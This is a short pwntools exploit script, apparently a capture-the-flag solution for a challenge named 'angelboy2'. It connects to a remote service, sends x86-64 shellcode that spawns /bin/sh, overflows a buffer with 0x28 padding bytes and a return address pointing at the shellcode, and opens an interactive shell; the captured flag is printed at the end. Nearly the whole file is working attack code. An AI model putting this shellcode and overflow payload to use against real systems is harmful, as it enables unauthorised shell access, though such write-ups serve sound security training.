from pwn import *

context.log_level = 'DEBUG'

#p = process('./angelboy2')
#gdb.attach(p) # Noticed the truely offset of eip, through sub $esp!!!
p = remote('140.110.112.217',2122)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
p.recvuntil(b':')
p.sendline(shellcode)
p.recvuntil(b':') # Whether the format of data is decimal or hex!!!!!!
p.sendline(b'A' * 0x28 + pack(0x601080, 64, 'little')) # Use vmmap to check whether the section can write
p.interactive()
# AngelboyCTF{YNLfLNEG0GCh3Ipw8stY}